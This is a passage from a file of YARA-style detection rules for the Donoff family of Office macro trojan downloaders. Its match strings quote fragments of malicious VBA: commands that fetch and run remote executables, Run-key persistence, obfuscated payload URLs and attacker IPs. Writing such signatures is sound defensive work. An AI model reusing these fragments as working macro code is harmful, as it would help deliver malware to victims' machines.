        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DRD!MTB"
        threat_id = "2147782765"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "winmgmts:\\\\\" & mamammakdkd & \"\\root\\default:StdRegProv" ascii //weight: 1
        $x_1_2 = {77 77 77 2e 62 69 74 6c 79 2e 63 6f 6d 2f 68 61 69 61 73 64 6a 61 69 73 64 6a 73 77 64 68 61 69 61 64 6b 2b 00 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = {77 77 77 2e 62 69 74 6c 79 2e 63 6f 6d 2f 68 61 69 61 6a 64 77 64 69 6a 77 77 64 68 77 69 64 64 77 69 6a 77 69 6a 2e 00 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_4 = "StrReverse(\"\"\"\")" ascii //weight: 1
        $x_1_5 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ascii //weight: 1
        $x_1_6 = "kaosdkqowkdok.SetStringValue" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DRV_2147782844_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DRV!MTB"
        threat_id = "2147782844"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "cmd & \"invoke-webrequest" ascii //weight: 1
        $x_1_2 = {67 69 74 68 75 62 2e 63 6f 6d 2f 6f 78 30 78 6f 2f 6f 78 30 78 6f 2e 67 69 74 68 75 62 2e 69 6f 2f 72 61 77 2f 6d 61 73 74 65 72 2f 61 72 74 69 66 61 63 74 2f 63 61 6c 63 2e 65 78 65 4c 00 63 6d 64 20 26 20 22 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_4 = "-outfile %tmp%/calc.exe" ascii //weight: 1
        $x_1_5 = "sh.Run cmd, 0, False" ascii //weight: 1
        $x_1_6 = "cmd & \"%tmp%/calc.exe\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MOK_2147783214_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MOK!MTB"
        threat_id = "2147783214"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "koko _" ascii //weight: 1
        $x_1_2 = "\"m\" _" ascii //weight: 1
        $x_1_3 = "\"s\" _" ascii //weight: 1
        $x_1_4 = "\"h\" _" ascii //weight: 1
        $x_1_5 = "\"t\" _" ascii //weight: 1
        $x_1_6 = "(0, \"open\", koko, \"h\" _" ascii //weight: 1
        $x_1_7 = "+ \"w\" + \".\" + \"b\" + \"i\" + \"t\" + \"l\" + \"y\" + \".\" + \"c\" + \"o\" + \"m/hwdinnwshdwdwdwqwhda\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_QM_2147783363_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QM!MTB"
        threat_id = "2147783363"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(\"MSX\" & \"ML2\" & \".X\" & \"MLH\" & \"TTP\")" ascii //weight: 1
        $x_1_2 = "Array(Nic.IPAddress(0), ComputerName)" ascii //weight: 1
        $x_1_3 = "GetIP_2()" ascii //weight: 1
        $x_1_4 = "Sub CalcMetrics()" ascii //weight: 1
        $x_1_5 = "BuildPropString" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_TBID_2147783568_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.TBID!MTB"
        threat_id = "2147783568"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 70 6c 69 74 28 [0-32] 2c 20 22 23 22 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {53 68 65 6c 6c 20 [0-32] 28 22 63 6d 64 20 2f 63 20 22 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 22 63 3a 5c 5c 75 73 65 72 73 5c 5c 70 75 62 6c 69 63 5c 5c [0-32] 2e 68 22 2c 20 4f 70 74 69 6f 6e 61 6c 20 [0-32] 20 3d 20 22 74 22 2c 20 4f 70 74 69 6f 6e 61 6c 20 [0-32] 20 3d 20 22 61 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 52 61 6e 67 65 2e 54 65 78 74 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_5 = {50 72 69 6e 74 20 23 31 2c 20 [0-32] 28 [0-32] 29 02 00 43 6c 6f 73 65 20 23 31 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_OLET_2147783722_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.OLET!MTB"
        threat_id = "2147783722"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "jziIHQp.ShellExecute \"P\" + n1, A2, \"\", \"\", 0" ascii //weight: 1
        $x_1_2 = "LOL.nQcDR(oUHhlnp(QTky), t8hg0, y70fdsd)" ascii //weight: 1
        $x_1_3 = "bVpO.Range(\"D500\").NoteText +" ascii //weight: 1
        $x_1_4 = "Worksheets(\"Sheet1\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_OLES_2147783787_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.OLES!MTB"
        threat_id = "2147783787"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".ShellExecute \"P\" + n1, A2, \"\", \"\", 0" ascii //weight: 1
        $x_1_2 = {3d 20 4c 4f 4c 2e [0-32] 28 [0-32] 28 [0-32] 29 2c 20 74 38 68 67 30 2c 20 79 37 30 66 64 73 64 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".Range(\"D500\").NoteText +" ascii //weight: 1
        $x_1_4 = ".Range(\"D507\").NoteText" ascii //weight: 1
        $x_1_5 = "Worksheets(\"Sheet1\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_HD_2147784784_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.HD!MTB"
        threat_id = "2147784784"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {77 77 77 2e 63 6a 6f 69 6e 74 2e 63 6f 6d 2f 64 6f 63 2f 32 31 5f 30 36 2f 4b 46 41 6d 50 58 70 35 50 69 33 5f 72 65 67 6c 65 73 33 30 2e 63 6d 64 39 00 68 74 74 70 73 3a 2f 2f}  //weight: 2, accuracy: Low
        $x_2_2 = "second & \" \" & \"c:\\pw\\regles30.cmd\"" ascii //weight: 2
        $x_2_3 = "PS_Execute troisieme" ascii //weight: 2
        $x_1_4 = "WScript.Shell\").Run sPSCmd" ascii //weight: 1
        $x_1_5 = "WScript.Shell\").Exec sPSCmd" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_HTRB_2147785369_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.HTRB!MTB"
        threat_id = "2147785369"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "datLibRef = \"c:\\programdata\\borderCurr.hta" ascii //weight: 1
        $x_1_2 = "= Shell(\"cmd /c \" & datLibRef)" ascii //weight: 1
        $x_1_3 = {4f 70 65 6e 20 64 61 74 4c 69 62 52 65 66 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 02 00 50 72 69 6e 74 20 23 31 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 52 61 6e 67 65 2e 54 65 78 74 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_ATGS_2147785371_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.ATGS!MTB"
        threat_id = "2147785371"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Theonas.Adam = \"bitly.com/pqwoeiqjdamsdajkshd" ascii //weight: 1
        $x_1_2 = "ReturnValue = CreateProcess(0&, cmdline$, 0&, 0&, 1&, _" ascii //weight: 1
        $x_1_3 = {6f 62 6a 2e 20 5f 02 00 53 61 62 6f 74 61 67 65 20 5f 02 00 28 54 68 65 6f 6e 61 73 2e 4d 69 6b 68 61 73 20 2b 20 54 68 65 6f 6e 61 73 2e 4e 6f 61 68 20 2b 20 54 68 65 6f 6e 61 73 2e 4e 6f 6e 6f 61 20 2b 20 54 68 65 6f 6e 61 73 2e 53 68 6f 6e 61 73 29}  //weight: 1, accuracy: Low
        $x_1_4 = {6f 62 6a 2e 20 5f 02 00 53 65 74 4e 6f 6e 65 6e 65}  //weight: 1, accuracy: Low
        $x_1_5 = {6f 62 6a 2e 20 5f 02 00 4d 6f 64 5f 41 75 74 6f 43 61 6c 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_HR_2147786357_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.HR!MTB"
        threat_id = "2147786357"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {31 36 32 2e 32 34 38 2e 32 32 35 2e 39 37 2f 31 2e 70 68 70 1b 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "fhgajkla.dll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_XDOP_2147786553_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.XDOP!MTB"
        threat_id = "2147786553"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= txgvci.Run(qhtulxa, cpwrcvimtnkpt)" ascii //weight: 1
        $x_1_2 = "RegParse = .Replace(mStr, \"$1\")" ascii //weight: 1
        $x_1_3 = "mStr = .Execute(html)(0)" ascii //weight: 1
        $x_1_4 = "Call kkxs.umnpztqoytgkonwhdsob" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_TR_2147786710_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.TR!MTB"
        threat_id = "2147786710"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "i \"t\", \"cmd /s /k \"" ascii //weight: 1
        $x_1_2 = "\".h\" & brForProc & \"a\"" ascii //weight: 1
        $x_1_3 = "Replace(funcFor, \"kklk\", vbNullString)" ascii //weight: 1
        $x_1_4 = "Call VBA.Shell(iDefineHtml & brForProc)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_ALT_2147794028_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.ALT!MTB"
        threat_id = "2147794028"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Public Function ikRcTfj(cDRWdnC)" ascii //weight: 1
        $x_1_2 = "ikRcTfj = Replace(cDRWdnC, \"03Nc@<$}(cpTHvl#u*3]{*.O83qcz6cPj~~qC8b7\", \"\")" ascii //weight: 1
        $x_1_3 = "Set MkypMVG = FszubiS.exEc(\"C:\\Windows\\Explorer \" & xaMcWqg)" ascii //weight: 1
        $x_1_4 = "If Err <> 0 Then MsgBox \"Can't Stop \"" ascii //weight: 1
        $x_1_5 = "AppActivate \"Microsoft PowerPoint Services...\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_ST_2147794244_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.ST!MTB"
        threat_id = "2147794244"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sheet1.coomon.ShellExecute# hehe.mm.ControlTipText, hehe.mm.Tag" ascii //weight: 1
        $x_1_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 68 65 6c 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: High
        $x_1_3 = "Attribute VB_Name = \"hehe\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RPQ_2147798002_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RPQ!MTB"
        threat_id = "2147798002"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "myURL = \"http://20.196.213.19/firewall.exe\"" ascii //weight: 1
        $x_1_2 = ".SaveToFile \"C:\\WINDOWS\\Temp\\Troubleshooter.zip\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RPQ_2147798002_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RPQ!MTB"
        threat_id = "2147798002"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "redYouYou = ActiveDocument.BuiltInDocumentProperties(\"Company\").Value" ascii //weight: 1
        $x_1_2 = "carolineKingSea = StrReverse(redYouYou)" ascii //weight: 1
        $x_1_3 = ".Execute FindText:=\"%5\", ReplaceWith:=inLineMy, Replace:=wdReplaceAll" ascii //weight: 1
        $x_1_4 = {53 65 74 20 6b 69 6e 67 4b 69 6e 67 59 6f 75 20 3d 20 4e 65 77 20 57 73 68 53 68 65 6c 6c 0d 0a 6b 69 6e 67 4b 69 6e 67 59 6f 75 2e 72 75 6e 20 6c 69 6e 65 4d 79 4d 79}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RPQ_2147798002_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RPQ!MTB"
        threat_id = "2147798002"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":/\"&\"/\"&\"i\"&\"m\"&\"p\"&\"e\"&\"r\"&\"i\"&\"a\"&\"l\"&\"m\"&\"m\"&\".c\"&\"o\"&\"m\"&\"/4\"&\"2\"&\"3\"&\"Q\"&\"u\"&\"v\"&\"p\"&\"C/f\"&\"e.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_2 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":/\"&\"/n\"&\"i\"&\"m\"&\"ix\"&\"t\"&\"u\"&\"t\"&\"o\"&\"r\"&\"i\"&\"a\"&\"l\"&\"s\"&\".i\"&\"r/S\"&\"p\"&\"i\"&\"1\"&\"m\"&\"d\"&\"d\"&\"p\"&\"6\"&\"i\"&\"W\"&\"2\"&\"/f\"&\"e.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_3 = "h\"&\"t\"&\"t\"&\"p\"&\"s:/\"&\"/t\"&\"e\"&\"c\"&\"h\"&\"n\"&\"o\"&\"z\"&\"o\"&\"n\"&\"e\"&\".a\"&\"z/Z\"&\"4f\"&\"M\"&\"F\"&\"8\"&\"i\"&\"7\"&\"2\"&\"l\"&\"7\"&\"E/f\"&\"e.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RPX_2147798647_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RPX!MTB"
        threat_id = "2147798647"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"set=createobject(\"microsoft.xmlhttp\")set=createobject(\"shell.application\")=specialpath+(\"\\qvqm.\").open\"get\",(\"h://www.d.m/wm/jkhfjhjzdkhhqzdvjzvjbdjvhbkbzdgdgdhhv/jbghvkgkjhjdhjdjgjbkhvgwvgqg.\"),false.send=.responsebodyif.status=200" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_QO_2147805211_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QO!MTB"
        threat_id = "2147805211"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "& \"*.dat\")" ascii //weight: 1
        $x_1_2 = {2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 73 22 20 2b [0-37] 2b 20 22 63 72 22 20 2b [0-37] 2b 20 22 69 70 74 2e 53 22 20 2b [0-37] 2b 20 22 68 65 22 20 2b [0-37] 2b 20 22 6c 6c 22 2c 20 22 22 29 2e 52 75 6e}  //weight: 1, accuracy: Low
        $x_1_3 = "CreateTextFile" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_QP_2147805360_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QP!MTB"
        threat_id = "2147805360"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2b 20 22 3a 5c 70 72 6f 22 20 2b [0-32] 2b 20 22 67 72 61 6d 64 22}  //weight: 1, accuracy: Low
        $x_1_2 = "CreateObject(\"Ion\")" ascii //weight: 1
        $x_1_3 = "IE.Navigate \"htom/\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SSM_2147806329_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SSM!MTB"
        threat_id = "2147806329"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {23 49 66 20 56 42 41 37 20 54 68 65 6e [0-3] 44 65 63 6c 61 72 65 20 50 74 72 53 61 66 65 20 53 75 62 20 52 65 64 69 72 65 63 74 53 74 61 6e 64 61 72 64 45 72 72 6f 72 20 4c 69 62 20 22 63 3a 5c 2e 69 6e 74 65 6c 5c 2e 72 65 6d 5c 31 2e 70 6e 67}  //weight: 1, accuracy: Low
        $x_1_2 = "Open \"c:\\.intel\\.rem\\1.png\" For Append As FileNum" ascii //weight: 1
        $x_1_3 = {2b 20 68 65 78 32 61 73 63 69 69 28 68 65 78 32 61 73 63 69 69 28 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 57 6f 72 64 73 28 [0-5] 29 29 29 20 2b 20 68 65 78 32 61 73 63 69 69 28 68 65 78 32 61 73 63 69 69 28 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 57 6f 72 64 73 28 [0-5] 29 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SSM_2147806329_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SSM!MTB"
        threat_id = "2147806329"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 75 62 6c 69 63 20 46 75 6e 63 74 69 6f 6e 20 73 28 [0-21] 2c 20 [0-21] 29 [0-3] 43 72 65 61 74 65 4f 62 6a 65 63 74 28 00 29 2e 65 78 65 63 20 22 63 3a 5c 77 69 6e 64 6f 77 73 5c 65 78 70 6c 6f 72 65 72 20 22 20 26 20 01 [0-3] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 53 61 76 65 41 73 32 20 46 69 6c 65 4e 61 6d 65 3a 3d [0-22] 2c 20 46 69 6c 65 46 6f 72 6d 61 74 3a 3d 32 [0-3] 45 6e 64 20 57 69 74 68}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 22 68 73 2e 74 70 69 22 [0-3] 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 73 20 53 74 72 52 65 76 65 72 73 65 28 22 6c 6c 65 22 20 2b 20 [0-15] 20 2b 20 22 72 63 73 77 22 29 2c 20 [0-32] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = "= StrReverse(ThisDocument.keywords)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_ARR_2147809377_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.ARR!MTB"
        threat_id = "2147809377"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ProgramW6432$" ascii //weight: 1
        $x_1_2 = "\\\\SysWOW64\\\\rundll32.exe" ascii //weight: 1
        $x_1_3 = {55 00 ac 00 73 00 ac 00 65 00 ac 00 72 00 ac 00 2d 00 ac 00 41 00 ac 00 67 00 ac 00 65 00 ac 00 6e 00 ac 00 74 00 ac 00 3a 00 ac 00 20 00 ac 00 4d 00 ac 00 6f 00 ac 00 7a 00 ac 00 69 00 ac 00 6c 00 ac 00 6c 00 ac 00 61 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RPA_2147810903_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RPA!MTB"
        threat_id = "2147810903"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "software\\microsoft\\windows\\currentversion\\run\",\"updating\",\"conhostmshtahttp://www.j.mp/" ascii //weight: 1
    condition:
